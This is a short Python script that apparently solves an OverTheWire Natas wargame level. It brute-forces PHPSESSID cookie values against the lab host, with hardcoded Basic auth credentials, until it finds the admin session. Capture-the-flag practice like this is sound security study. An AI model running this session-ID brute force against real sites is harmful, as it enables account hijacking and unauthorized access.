import requests
url = "http://natas18.natas.labs.overthewire.org/"
headers = {"Authorization": "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==","cookie": "PHPSESSID=637"}

normalUserContent = requests.get(url, headers=headers).content

for i in range(640):
	print("trying phpsessid = " + str(i))
	headers["cookie"] = f"PHPSESSID={i}"
	requestContent = requests.get(url, headers=headers).content
	if requestContent != normalUserContent:
		print("Found Admin Login: PHPSESSID = " + str(i))
		print(requestContent)
		exit()